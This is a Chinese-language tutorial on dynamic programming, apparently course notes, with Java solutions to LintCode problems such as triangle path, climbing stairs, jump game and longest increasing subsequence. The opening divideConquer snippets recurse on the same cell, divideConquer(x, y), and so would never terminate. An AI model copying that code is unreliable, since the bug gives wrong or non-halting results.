<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divideConquer</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x == n)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A[x][y] + Math.min(divideConquer(x, y), divideConquer(x, y + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Divder-Conquer-Memorization"><a href="#Divder-Conquer-Memorization" class="headerlink" title="Divder Conquer + Memorization"></a>Divder Conquer + Memorization</h3><p>我们想优化上面两种DFS的方法，首先看上面的方法有没有<strong>重复计算</strong>或者<strong>无用计算</strong>。 我们拿分治法进行改进，可以发现，在调用dividerConquer(1,0)和 divideConquer(1,1)的时候，都会用到divideConquer(2,1)这个值，但是我们却计算了两次。这就是我们可以优化的点 – 重复计算。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divideConquer</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x == n)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( hash[x][y] != Integer.MAX_VALUE)&#123;</span><br><span class="line">        <span class="keyword">return</span> hash[x][y];</span><br><span class="line">    &#125;</span><br><span class="line">    hash[x][y] = A[x][y] + Math.min(divideConquer(x, y), divideConquer(x, y + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> hash[x][y];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们使用全局变量hash[][]来存储对应位置到底部的最小路径和，并将其初始化为Integer.MAX_VALUE，这样在碰到计算过的位置的时候就会跳过重复的运算。 这种方法的时间复杂度为<code>O(n * n)</code>，因为每个点的只会进入divideConquer这个函数两次，一次需要计算hash值，第二次会直接返回hash值。一共有<code>n * (n - 1) / 2</code> 个点，所以复杂度是<code>O(n^2)</code></p>
<p>这种方法叫记忆化搜索，记忆化搜索的本质就是动态规划。 二叉树的子问题是没有重复的，而动态规划的子问题有重叠部分（例如上题的三角形问题）</p>
<h3 id="Traditional-Dynamic-Programming"><a href="#Traditional-Dynamic-Programming" class="headerlink" title="Traditional Dynamic Programming"></a>Traditional Dynamic Programming</h3><p>再使用多重循环的方式来做一下。 我们可以发现计算一个点到底部的最短距离的时候需要自己下面的点，那我们可不可以从下往上计算呢？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(<span class="keyword">int</span>[][] triangle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(triangle == <span class="keyword">null</span> || triangle.length == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> n = triangle.length;</span><br><span class="line">    <span class="keyword">int</span>[][] hash = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">    <span class="comment">// 初始化三角形的底边</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        hash[n-<span class="number">1</span>][i] = triangle[n-<span class="number">1</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// bottom up</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = triangle.length - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; triangle[i].length; j++)&#123;</span><br><span class="line">            hash[i][j] = Math.min(hash[i+<span class="number">1</span>][j], hash[i+<span class="number">1</span>][j+<span class="number">1</span>]) + triangle[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>算法时间复杂度<code>O(n^2)</code>,空间复杂度也是<code>O(n^2)</code>。 当然我们也可以top down, 用<code>f[i][j]</code>来表示从头结点到当前节点的最短路径。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(<span class="keyword">int</span>[][] triangle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (triangle == <span class="keyword">null</span> || triangle.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// state: f[x][y] = minimum path value from 0,0 to x,y</span></span><br><span class="line">    <span class="keyword">int</span> n = triangle.length;</span><br><span class="line">    <span class="keyword">int</span>[][] f = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize </span></span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        f[i][<span class="number">0</span>] = f[i - <span class="number">1</span>][<span class="number">0</span>] + triangle[i][<span class="number">0</span>];</span><br><span class="line">        f[i][i] = f[i - <span class="number">1</span>][i - <span class="number">1</span>] + triangle[i][i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// top down</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++) &#123;</span><br><span class="line">            f[i][j] = Math.min(f[i - <span class="number">1</span>][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>]) + triangle[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// answer</span></span><br><span class="line">    <span class="keyword">int</span> best = f[n - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        best = Math.min(best, f[n - <span class="number">1</span>][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> best;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="什么情况下使用动态规划？"><a href="#什么情况下使用动态规划？" class="headerlink" title="什么情况下使用动态规划？"></a>什么情况下使用动态规划？</h2><p>满足下列三个条件之一极有可能使用动态规划:</p>
<ol>
<li>求最大值最小值</li>
<li>判断是否可行</li>
<li>统计方案个数</li>
</ol>
<p>什么情况下不使用动态规划？</p>
<ol>
<li>求出所有的具体方案而非方案个数 <a href="http://www.lintcode.com/en/problem/palindrome-partitioning/" target="_blank" rel="noopener">palindrome partitioning</a></li>
<li>输入数据是一个集合而不是一个序列 <a href="http://www.lintcode.com/en/problem/longest-consecutive-sequence/" target="_blank" rel="noopener">longest consecutive sequence</a></li>
<li>暴力算法的复杂度已经是多项式级别 （动态规划擅长于优化指数级别<code>2^n n!</code>复杂度到多项式级别<code>n^2, n^3</code>复杂度，而不擅长优化<code>n^3</code>到<code>n^2</code></li>
</ol>
<h2 id="面试中常见的动态规划类型"><a href="#面试中常见的动态规划类型" class="headerlink" title="面试中常见的动态规划类型"></a>面试中常见的动态规划类型</h2><ol>
<li>坐标型动态规划</li>
<li>接龙型动态规划</li>
<li>划分型动态规划</li>
<li>匹配型动态规划</li>
<li>背包型动态规划</li>
<li>区间型动态规划</li>
<li>树图型动态规划</li>
<li>博弈型动态规划</li>
</ol>
<p>九章算法班主要讲前两种</p>
<h2 id="动态规划四要素"><a href="#动态规划四要素" class="headerlink" title="动态规划四要素"></a>动态规划四要素</h2><ol>
<li>状态： 存储小规模问题的结果</li>
<li>方程：状态之间的联系、怎么通过小的状态来计算大的状态</li>
<li>初始化：最极限的小状态是什么，起点</li>
<li>答案：最大的状态是什么，终点</li>
</ol>
<h1 id="坐标型动态规划"><a href="#坐标型动态规划" class="headerlink" title="坐标型动态规划"></a>坐标型动态规划</h1><ul>
<li>state: <code>f[x]</code>表示从起点走到x，<code>f[x][y]</code>表示从起点走到坐标x,y</li>
<li>function: 研究走到x,y 这个点之前的一步</li>
<li>initialize：起点</li>
<li>answer：终点</li>
</ul>
<h2 id="Example1-Minimum-Path-Sum"><a href="#Example1-Minimum-Path-Sum" class="headerlink" title="Example1: Minimum Path Sum"></a>Example1: Minimum Path Sum</h2><p><a href="http://www.lintcode.com/en/problem/minimum-path-sum/" target="_blank" rel="noopener">Minimum Path Sum</a> 与刚刚做的三角形类似的一道题目，求从左上角走到右下角的最短路径和。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minPathSum</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(grid == <span class="keyword">null</span> || grid.length == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m = grid.length;</span><br><span class="line">    <span class="keyword">int</span> n = grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="comment">// state</span></span><br><span class="line">    <span class="keyword">int</span>[][] f = <span class="keyword">new</span> <span class="keyword">int</span>[m][n];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize </span></span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">        f[i][<span class="number">0</span>] = f[i - <span class="number">1</span>][<span class="number">0</span>] + grid[i][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">        f[<span class="number">0</span>][j] = f[<span class="number">0</span>][j - <span class="number">1</span>] + grid[<span class="number">0</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// function</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">            f[i][j] = Math.min(f[i-<span class="number">1</span>][j], f[i][j-<span class="number">1</span>]) + grid[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//answer</span></span><br><span class="line">    <span class="keyword">return</span> f[m-<span class="number">1</span>][n-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Example2-Climbing-Stairs"><a href="#Example2-Climbing-Stairs" class="headerlink" title="Example2: Climbing Stairs"></a>Example2: Climbing Stairs</h2><p><a href="http://www.lintcode.com/en/problem/climbing-stairs/" target="_blank" rel="noopener">Climbing Stairs</a> 每次只能走1阶或者2阶，问爬n层台阶一共有多少方式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// return climbStairs(n - 1) + climbStairs(n - 2);</span></span><br><span class="line">    <span class="comment">//state 表示走到第n个台阶有多少个方案</span></span><br><span class="line">    <span class="keyword">int</span>[] state = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//initial </span></span><br><span class="line">    state[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    state[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//function</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        state[i] = state[i - <span class="number">1</span>] + state[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// answer</span></span><br><span class="line">    <span class="keyword">return</span> state[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Example3-Jump-Game"><a href="#Example3-Jump-Game" class="headerlink" title="Example3: Jump Game"></a>Example3: Jump Game</h2><p><a href="http://www.lintcode.com/en/problem/jump-game/" target="_blank" rel="noopener">Jump Game</a> 给定一个数组A，数组中的每个元素代表你在这个位置可以跳多远。如果最初你在index=0的位置，问是否能够跳到最后一个index处。</p>
<ul>
<li>state: 定义一个can数组，数组用来标记是否能跳转到这个位置</li>
<li>function: 对于下标i，遍历其之前的下标j， 如果有<code>can[j] == True &amp;&amp; A[j] + j &gt;= i</code>的说明可以跳到i，则把<code>can[i]</code>置为1</li>
<li>initialize: 初始化can[0] = True</li>
<li>answer: can[A.length - 1]</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canJump</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span>[] can = <span class="keyword">new</span> <span class="keyword">boolean</span>[A.length];</span><br><span class="line">    can[<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (can[j] &amp;&amp; j + A[j] &gt;= i) &#123;</span><br><span class="line">                can[i] = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> can[A.length - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="接龙型动态规划"><a href="#接龙型动态规划" class="headerlink" title="接龙型动态规划"></a>接龙型动态规划</h1><h2 id="Example1-Longest-Increasing-Subsequence"><a href="#Example1-Longest-Increasing-Subsequence" class="headerlink" title="Example1: Longest Increasing Subsequence"></a>Example1: Longest Increasing Subsequence</h2><p><a href="http://www.lintcode.com/en/problem/longest-increasing-subsequence/" target="_blank" rel="noopener">Longest Increasing Subsequence</a> 找到最长递增子序列，并返回其长度。</p>
<ul>
<li>state： state[i]记录到当前节点的最长子序列</li>
<li>function： 遍历之前的结点j，找比自己小的节点中state[i]最大的那一个</li>
<li>initialize: state所有元素都初始化为1，因为至少有元素本身</li>
<li>answer: state中的最大值<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestIncreasingSubsequence</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// state</span></span><br><span class="line">    <span class="keyword">int</span>[] state = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    <span class="comment">// initialize</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        state[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// function</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; nums[j])&#123;</span><br><span class="line">                state[i] = Math.max(state[j] + <span class="number">1</span>, state[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// System.out.println(state[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ans</span></span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length; i++)&#123;</span><br><span class="line">        max = Math.max(max, state[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>程序里初始化和answer部分都可以合并到function中去写。</p>
<h2 id="Example2-Russian-Doll-Envelopes"><a href="#Example2-Russian-Doll-Envelopes" class="headerlink" title="Example2: Russian Doll Envelopes"></a>Example2: Russian Doll Envelopes</h2><p><a href="http://www.lintcode.com/problem/russian-doll-envelopes/" target="_blank" rel="noopener">Russian Doll Envelopes</a>俄罗斯套娃，给定一些整数对 (w, h),分别代表信封的宽度和高度。一个信封的宽和高同时大于另一个信封的时候可以装下另一个信封。求最大信封嵌套层数。<br>这道题目其实和上面的最长递增子序列思路是类似的，我们需要先对其进行排序(排序之后方便我们找可以套进自己的信封)，排序的时候需要同时比较长和宽。 排序之后可以按照最长递增子序列的思路来做</p>
<ul>
<li>state: 当前信封的最大嵌套层数</li>
<li>initialize: 所有信封的state都等于1</li>
<li>function: 遍历之前的信封，如果第j个信封长和宽都比当前的信封小，则去<code>state[i] = Math.max(state[j] + 1, state[i])</code></li>
<li>answer: state中的最大元素</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxEnvelopes</span><span class="params">(<span class="keyword">int</span>[][] A)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A == <span class="keyword">null</span> || A.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> n = A.length;</span><br><span class="line">    Arrays.sort(A, <span class="keyword">new</span> Comparator&lt;<span class="keyword">int</span>[]&gt;() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span>[] b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (a[<span class="number">0</span>] != b[<span class="number">0</span>]) &#123; <span class="comment">// length</span></span><br><span class="line">                <span class="keyword">return</span> a[<span class="number">0</span>] - b[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="comment">// width</span></span><br><span class="line">                <span class="keyword">return</span> a[<span class="number">1</span>] - b[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// state</span></span><br><span class="line">    <span class="keyword">int</span>[] f = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="comment">// initalize</span></span><br><span class="line">        f[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; i; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[j][<span class="number">0</span>] &lt; A[i][<span class="number">0</span>] &amp;&amp; A[j][<span class="number">1</span>] &lt; A[i][<span class="number">1</span>]) &#123;</span><br><span class="line">                f[i] = Math.max(f[i], f[j] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        res = Math.max(res, f[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Example3-Largest-Divisible-subset"><a href="#Example3-Largest-Divisible-subset" class="headerlink" title="Example3: Largest Divisible subset"></a>Example3: Largest Divisible subset</h2><p><a href="http://www.lintcode.com/en/problem/largest-divisible-subset/" target="_blank" rel="noopener">Largest Divisible Subset</a> 这道题要找出最长的可整除数列。 这道题因为不是要求长度，而是要求出这个数列，所以我们就需要一个额外的数组来存着这个数列。存储这个数列的时候用到了一个小技巧。用father数组来存储当前元素在等比数列中下一个元素的位置。</p>
<ul>
<li>state: dp存储当前元素的最长divisible数列的长度</li>
<li>initialize： dp初始化为1，father初始化为-1表示还没有后继</li>
<li>function: 对于节点i，遍历之前的节点j，如果<code>nums[i] % nums[j] == 0</code>的话就把dp[i]置为<code>Math.max(dp[i], dp[j] + 1)</code> 并把father[i]置为j, 表示第i个结点的前继结点是j</li>
<li>answer: 最后我们找到了最长等比数列的结束是index，则不断将nums[index]加入结果数组，并更新index为<code>index = father[index]</code>。直到index==-1 ( 得到的答案是从大到小的)</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">largestDivisibleSubset</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    <span class="keyword">int</span>[] father = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>, index = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        dp[i] = <span class="number">1</span>;</span><br><span class="line">        father[i] = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] % nums[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">1</span> + dp[j] &gt; dp[i]) &#123;</span><br><span class="line">                    dp[i] = dp[j] + <span class="number">1</span>;</span><br><span class="line">                    father[i] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dp[i] &gt;= max) &#123;</span><br><span class="line">            max = dp[i];</span><br><span class="line">            index = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (index != -<span class="number">1</span>) &#123;</span><br><span class="line">        result.add(nums[index]);</span><br><span class="line">        index = father[index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
